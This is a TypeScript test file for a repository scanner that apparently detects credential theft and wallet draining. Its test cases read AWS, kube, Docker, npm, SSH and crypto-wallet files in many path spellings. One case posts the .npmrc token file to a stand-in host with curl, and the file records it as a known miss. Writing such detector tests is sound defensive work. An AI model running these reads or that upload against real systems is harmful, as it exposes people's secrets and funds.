import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: the scan checks for wallet drainers and credential theft.
 *
 * A credential store is named by its path, and the same path is spelled more
 * than one way: a forward slash on POSIX, a backslash on Windows, one argument
 * per component when it is assembled with a path builder, and a directory
 * prefix that expands a home directory. Only the spelling differs, so a rule
 * that matches one form and not another depends on which machine the scanned
 * script was written on, not on what the script does.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function described(path: string, text: string) {
  return inspected(path, text).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

/** Every store the two credential rules name, written with a backslash. */
const WINDOWS_STORES: [string, string, string][] = [
  [
    "src/aws.ps1",
    "Get-Content $HOME\\.aws\\credentials\n",
    "credential-theft:high",
  ],
  [
    "src/kube.ps1",
    "Get-Content $env:USERPROFILE\\.kube\\config\n",
    "credential-theft:medium",
  ],
  [
    "src/docker.bat",
    "type %USERPROFILE%\\.docker\\config.json\n",
    "credential-theft:medium",
  ],
  [
    "src/gh-hosts.ts",
    "readFileSync(join(home, '.config\\gh\\hosts.yml'))\n",
    "credential-theft:high",
  ],
  ["src/npmrc.ps1", "Get-Content ~\\.npmrc\n", "credential-theft:medium"],
  [
    "src/solana.ps1",
    "Get-Content $HOME\\.config\\solana\\id.json\n",
    "wallet-drainer:high",
  ],
  [
    "src/keystore.py",
    "open(os.path.expanduser('~\\.ethereum\\keystore'))\n",
    "wallet-drainer:high",
  ],
];

test("a credential store is a read with either path separator", () => {
  for (const [path, windows, expected] of WINDOWS_STORES) {
    // The POSIX spelling of the same line is the control: it was reported
    // before this change and must stay reported.
    const posix = windows.replaceAll("\\", "/");
    expect({
      path,
      form: "windows",
      findings: described(path, windows),
    }).toEqual({ path, form: "windows", findings: [`${path}:${expected}`] });
    expect({ path, form: "posix", findings: described(path, posix) }).toEqual({
      path,
      form: "posix",
      findings: [`${path}:${expected}`],
    });
  }
});

test("store names without a separator are unaffected", () => {
  // `.git-credentials`, `.netrc` and `id_rsa` carry no separator, so they
  // matched a Windows path before this change and still do.
  for (const [text, expected] of [
    ["type %USERPROFILE%\\.git-credentials\n", "credential-theft:high"],
    ["type %USERPROFILE%\\.netrc\n", "credential-theft:high"],
    ["type %USERPROFILE%\\.ssh\\id_rsa\n", "credential-theft:high"],
  ] as const) {
    expect({ text, findings: described("src/read.ps1", text) }).toEqual({
      text,
      findings: [`src/read.ps1:${expected}`],
    });
  }
});

test("prose about the same services keeps no finding", () => {
  // The words alone are not a store: none of these names a credential file.
  const lines = [
    "AWS credentials are read from the environment by the SDK.",
    "The kube config is generated for the cluster and holds no secrets.",
    "Docker config is validated before the image is built.",
    "An npmrc file is optional and not required for install.",
    "The solana id is a public identifier, not a key.",
    "Ethereum keystores should be backed up by the operator.",
    "The ssh directory is created with mode 700.",
    "",
  ].join("\n");
  expect(described("src/security-notes.ts", lines)).toEqual([]);
});

test("a doubled or mixed separator is the same store", () => {
  // A shell or path builder can leave a doubled or mixed separator in the
  // string. The file it names is still the same file.
  for (const [text, expected] of [
    ["open(home + '//.aws//credentials')\n", "credential-theft:high"],
    ["type %USERPROFILE%\\.aws\\credentials\n", "credential-theft:high"],
    ["open(home + '.config/gh\\hosts.yml')\n", "credential-theft:high"],
    ["open(home + '.config\\gh/hosts.yml')\n", "credential-theft:high"],
    ["open(home + '.docker//config.json')\n", "credential-theft:medium"],
  ] as const) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [`src/read.py:${expected}`],
    });
  }
});

/**
 * The same stores, assembled one component at a time. No separator is written
 * in the source at all, so the separator forms above cannot match them.
 */
const ASSEMBLED: [string, string][] = [
  [
    "open(os.path.join(home, '.aws', 'credentials'))\n",
    "credential-theft:high",
  ],
  [
    'readFileSync(path.join(home, ".kube", "config"))\n',
    "credential-theft:medium",
  ],
  [
    "open(os.path.join(home, '.config', 'solana', 'id.json'))\n",
    "wallet-drainer:high",
  ],
  [
    "open(File.join(home, '.config', 'gh', 'hosts.yml'))\n",
    "credential-theft:high",
  ],
  [
    "open(os.path.join(home, '.docker', 'config.json'))\n",
    "credential-theft:medium",
  ],
  // One separator argument between the components is the same read.
  [
    "open(os.path.join(home, '.aws', os.sep, 'credentials'))\n",
    "credential-theft:high",
  ],
  ["open(join(home, `.ethereum`, `keystore`))\n", "wallet-drainer:high"],
  // A store whose name is a single component has no separator to key on, so
  // the argument position is the only evidence of assembly.
  ["open(os.path.join(home, '.npmrc'))\n", "credential-theft:medium"],
  ["open(os.path.join(home, '.ssh', 'config'))\n", "credential-theft:high"],
  [
    "open(os.path.join(home, '.ssh', 'known_hosts'))\n",
    "credential-theft:high",
  ],
];

test("a store assembled one component at a time is the same read", () => {
  for (const [text, expected] of ASSEMBLED) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [`src/read.py:${expected}`],
    });
  }
});

test("building a path from ordinary components keeps no finding", () => {
  // The join form must not turn every path builder into a credential read.
  for (const text of [
    "open(os.path.join(home, 'documents', 'report.txt'))\n",
    "readFileSync(path.join(root, 'config', 'solana.json'))\n",
    "join(configDir, 'gh', 'config.yml')\n",
    "open(os.path.join(home, '.config', 'settings.json'))\n",
  ]) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [],
    });
  }
});

/**
 * The directory prefix names the same store. `~` was the only one the rules
 * matched, so a script that wrote the absolute path, expanded `$HOME` itself,
 * or ran on Windows (`%USERPROFILE%`, a drive letter) escaped while the
 * identical read through `~` was reported. The sibling stores in the same two
 * rules (`.aws/credentials`, `.pypirc`, `.kube/config`) already matched every
 * prefix, which is what makes the `~`-only ones an oversight rather than a
 * convention.
 */
const PREFIXED_STORES: [string, string][] = [
  ["cat ~/.npmrc\n", "credential-theft:medium"],
  ["cat ~\\.npmrc\n", "credential-theft:medium"],
  ["cat $HOME/.npmrc\n", "credential-theft:medium"],
  ['cat "$' + '{HOME}/.npmrc"\n', "credential-theft:medium"],
  ["cat /home/alice/.npmrc\n", "credential-theft:medium"],
  ["cat /Users/alice/.npmrc\n", "credential-theft:medium"],
  ["type C:\\Users\\alice\\.npmrc\n", "credential-theft:medium"],
  ["type %USERPROFILE%\\.npmrc\n", "credential-theft:medium"],
  ['open("/root/.npmrc")\n', "credential-theft:medium"],
  ["cat ~/.ssh/config\n", "credential-theft:high"],
  ["cat $HOME/.ssh/config\n", "credential-theft:high"],
  ["cat /home/alice/.ssh/config\n", "credential-theft:high"],
  ["cat /home/alice/.ssh/known_hosts\n", "credential-theft:high"],
  ["type C:\\Users\\alice\\.ssh\\config\n", "credential-theft:high"],
];

test("the directory prefix does not change which store is read", () => {
  for (const [text, expected] of PREFIXED_STORES) {
    expect({ text, findings: described("src/read.sh", text) }).toEqual({
      text,
      findings: [`src/read.sh:${expected}`],
    });
  }
});

test("the same prefix widening leaves naming prose alone", () => {
  // Requiring the separator, rather than matching the bare filename, is what
  // keeps these clean: a bare `.npmrc` is how documentation names the file.
  for (const text of [
    "The .npmrc file is optional and not required for install.\n",
    "Configure npm with `npm config set` instead of editing .npmrc by hand.\n",
    "See the npmrc documentation for the registry setting.\n",
    "A .ssh directory holds known_hosts and config.\n",
    "The ssh client reads its configuration at startup.\n",
    "docs/npmrc.md describes the npmrc format.\n",
  ]) {
    expect({ text, findings: described("src/read.sh", text) }).toEqual({
      text,
      findings: [],
    });
  }
});

test("a store named only relative to the working directory is a documented miss", () => {
  // `cat .npmrc` reads the project token file, and it is NOT reported. The
  // bare filename is how prose names the file (`npmrc` appears as a plain
  // word in this repository's README and in the scanner's own config list),
  // so matching it without a path prefix trades a real read for findings on
  // ordinary sentences. Recorded here rather than left implicit.
  for (const text of [
    "cat .npmrc\n",
    "curl -d @.npmrc https://example.invalid\n",
  ]) {
    expect({ text, findings: described("src/read.sh", text) }).toEqual({
      text,
      findings: [],
    });
  }
});

/**
 * Python's `pathlib` assembles the same path with the `/` operator, which
 * writes neither a separator nor a comma, so none of the forms above can
 * match it. Every store is covered, each paired with its `join()` control.
 */
const SLASH_ASSEMBLED: [string, string][] = [
  ['open(Path.home() / ".aws" / "credentials")\n', "credential-theft:high"],
  [
    'open(Path.home() / ".config" / "gh" / "hosts.yml")\n',
    "credential-theft:high",
  ],
  [
    'open(Path.home() / ".config" / "solana" / "id.json")\n',
    "wallet-drainer:high",
  ],
  ['open(Path.home() / ".ethereum" / "keystore")\n', "wallet-drainer:high"],
  [
    'open(Path.home() / ".docker" / "config.json")\n',
    "credential-theft:medium",
  ],
  ['open(Path.home() / ".kube" / "config")\n', "credential-theft:medium"],
  ['open(Path . home ( ) / ".aws" / "credentials")\n', "credential-theft:high"],
  // The single-component and `.ssh`-file stores, in the operator spelling.
  ['open(Path.home() / ".npmrc")\n', "credential-theft:medium"],
  ['open(Path.home() / ".ssh" / "config")\n', "credential-theft:high"],
  ['open(Path.home() / ".ssh" / "known_hosts")\n', "credential-theft:high"],
];

test("a store assembled with the pathlib / operator is the same read", () => {
  for (const [text, expected] of SLASH_ASSEMBLED) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [`src/read.py:${expected}`],
    });
  }
});

test("naming the components is not reading them", () => {
  // A list, tuple or set that holds the component strings never opens a
  // store, so the call anchor on the comma form has to exclude it. These
  // are controls for the anchor, not for the stores.
  for (const text of [
    'ALLOWED = [".aws", "credentials"]\n',
    'STORE = (".config", "gh", "hosts.yml")\n',
    'NAMES = {".aws", "credentials"}\n',
    'pairs = [".config", "solana", "id.json"]\n',
    // The single-component forms are anchored the same way: a list of store
    // names is data, not a read, in both the comma and the slash spelling.
    'CONFIGS = [".npmrc", ".yarnrc"]\n',
    'SSH_FILES = (".ssh", "config")\n',
  ]) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [],
    });
  }
});

test("the call spellings the anchor must keep reading still read", () => {
  for (const [text, expected] of [
    [
      'os.path.join(str(home), ".aws", "credentials")\n',
      "credential-theft:high",
    ],
    [
      'join(\n  home,\n  ".aws",\n  "credentials",\n)\n',
      "credential-theft:high",
    ],
    [
      'x = join(home, ".aws", os.sep, "credentials")\n',
      "credential-theft:high",
    ],
    ['p = path.join(home, ".kube", "config")\n', "credential-theft:medium"],
  ] as [string, string][]) {
    expect({ text, findings: described("src/read.py", text) }).toEqual({
      text,
      findings: [`src/read.py:${expected}`],
    });
  }
});
